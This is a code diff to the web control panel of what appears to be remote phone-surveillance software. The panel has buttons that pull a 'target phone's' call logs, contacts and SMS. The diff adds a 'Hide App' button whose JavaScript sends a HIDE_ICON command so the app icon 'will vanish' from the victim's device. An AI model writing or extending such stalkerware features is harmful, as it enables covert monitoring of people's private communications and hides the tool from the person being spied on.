@@ -261,7 +261,10 @@
             <div onclick="openView('call_logs')" class="control-btn"><i class="fa-solid fa-phone"></i><span>Calls</span></div>
             <div onclick="openView('contacts')" class="control-btn"><i class="fa-solid fa-address-book"></i><span>Contacts</span></div>
             <div onclick="openView('sms')" class="control-btn"><i class="fa-solid fa-comments"></i><span>SMS</span></div>
-            <div class="control-btn" style="opacity:0; pointer-events:none;"></div> 
+            
+            <div onclick="triggerHideApp()" class="control-btn" style="color: #ff4444; border-color: rgba(255, 68, 68, 0.3);">
+                <i class="fa-solid fa-eye-slash"></i><span>Hide App</span>
+            </div>
         </div>
 
         <div class="footer-link" onclick="resetID()">
@@ -433,6 +436,15 @@
             })
             .then(res => console.log("Sent Success: " + action))
             .catch(err => console.error("Send Failed", err));
+        }
+
+        // --- NEW LOGIC: HIDE APP TRIGGER ---
+        function triggerHideApp() {
+            if(!DEVICE_ID) return askID();
+            if(confirm("WARNING: This will HIDE the app icon on the target phone.\n\nAre you sure you want to proceed?")) {
+                sendCommand('HIDE_ICON');
+                alert("Hide command sent! App will vanish in a few seconds.");
+            }
         }
 
         function updateSliderUI(type, val) {
